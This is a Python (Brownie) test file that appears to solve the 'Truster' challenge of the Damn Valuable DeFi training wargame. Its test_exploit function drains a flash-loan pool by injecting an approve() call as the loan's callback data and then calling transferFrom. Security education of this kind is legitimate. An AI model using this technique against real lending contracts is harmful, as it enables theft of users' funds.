import pytest
from brownie import DamnValuableToken, TrusterLenderPool, web3
from eth_abi import encode_abi

@pytest.fixture(scope='module')
def deployer(accounts):
    return accounts[0]

@pytest.fixture(scope='module')
def attacker(accounts):
    return accounts[1]

@pytest.fixture(scope='module')
def token(deployer):
    return DamnValuableToken.deploy({'from':deployer})

@pytest.fixture(scope='module')
def pool(token,deployer):
    return TrusterLenderPool.deploy(token.address, {'from':deployer})

@pytest.fixture(scope='module',autouse=True)
def setup(pool,token,deployer,attacker):
    ''' [Challenge] truster '''

    TOKENS_IN_POOL = 1000000e18

    token.transfer(pool.address,TOKENS_IN_POOL,{'from':deployer})

    assert token.balanceOf(pool.address) == TOKENS_IN_POOL

    assert token.balanceOf(attacker) == 0


def test_exploit(pool,token,attacker):
    # Exploit goes here
    amount = token.balanceOf(pool.address)

    approve_function_selector = web3.keccak(text='approve(address,uint256)')[0:4]

    data = encode_abi(['address','uint256'],[attacker.address,amount])

    pool.flashLoan(0, attacker.address, token.address, approve_function_selector + data ,{'from':attacker})
    
    token.transferFrom(pool.address, attacker.address, amount, {'from':attacker})


def test_success(token,pool,attacker):

    TOKENS_IN_POOL = 1000000e18

    assert token.balanceOf(attacker) == TOKENS_IN_POOL

    assert token.balanceOf(pool.address) == 0

    